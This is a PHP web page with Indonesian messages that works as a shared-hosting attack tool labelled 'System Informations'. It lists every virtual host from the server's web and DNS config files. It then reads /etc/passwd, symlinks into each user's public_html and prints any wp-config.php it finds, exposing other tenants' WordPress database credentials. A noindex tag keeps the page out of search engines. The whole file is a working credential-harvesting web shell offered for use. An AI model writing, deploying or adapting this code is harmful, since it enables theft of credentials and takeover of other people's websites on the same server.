<?php
session_start();

if (!isset($_SESSION['token'])) {
    $_SESSION['token'] = bin2hex(random_bytes(16));
}

function b64u_encode($str) {
    return rtrim(strtr(base64_encode($str), '+/', '-_'), '=');
}
function b64u_decode($str) {
    $pad = strlen($str) % 4;
    if ($pad > 0) {
        $str .= str_repeat('=', 4 - $pad);
    }
    return base64_decode(strtr($str, '-_', '+/'));
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="robots" content="noindex,nofollow">
</head>
<body>
<h2>🧠 System Informations</h2>

<h3>🔍 Domains Total</h3>
<?php
function count_vhosts() {
    $vhosts = [];
    $confDirs = [
        '/etc/httpd/conf', 
        '/etc/httpd/conf.d', 
        '/etc/nginx/conf.d', 
        '/etc/apache2/sites-enabled', 
        '/var/named'
    ];
    foreach ($confDirs as $dir) {
        if (is_dir($dir)) {
            $files = glob($dir . '/*');
            foreach ($files as $file) {
                $content = @file_get_contents($file);
                preg_match_all('/ServerName\\s+([^\\s]+)/i', $content, $matches);
                if (!empty($matches[1])) {
                    $vhosts = array_merge($vhosts, $matches[1]);
                }
            }
        }
    }
    $unique = array_unique($vhosts);
    echo "Total vhosts ditemukan: " . count($unique) . "<br>";
    foreach ($unique as $vh) {
        echo "↪️ $vh<br>";
    }
}
count_vhosts();
?>

<h3>🔗 Auto Symlink <code>Only WP</code></h3>
<form method="post">
    <input type="submit" name="mass_symlink" value="Get">
</form>
<?php
if (isset($_POST['mass_symlink'])) {
    $symlink_dir = "symlinks";
    if (!is_dir($symlink_dir)) {
        mkdir($symlink_dir);
        echo "📁 Folder 'symlinks/' dibuat<br>";
    }

    $lines = file('/etc/passwd');
    foreach ($lines as $line) {
        $parts = explode(':', $line);
        $user = $parts[0];
        $home = $parts[5];
        $target_path = "$home/public_html";
        $linkname = "$symlink_dir/$user";

        if (is_dir($target_path)) {
            if (file_exists($linkname)) {
                unlink($linkname);
            }

            if (@symlink($target_path, $linkname)) {
                echo "✅ Symlink dibuat: <b>$linkname</b> → $target_path<br>";
                $config_path = "$linkname/wp-config.php";
                if (file_exists($config_path)) {
                    echo "🗂️ wp-config.php ditemukan untuk user <b>$user</b><br>";
                    $config_content = @file_get_contents($config_path);
                    echo "<textarea rows='5' cols='80'>" . htmlentities($config_content) . "</textarea><br>";
                } else {
                    echo "❌ Tidak ada wp-config.php di <b>$user</b><br>";
                }
            } else {
                echo "❌ Gagal membuat symlink untuk <b>$user</b><br>";
            }
        }
    }
}
?>
</body>
</html>
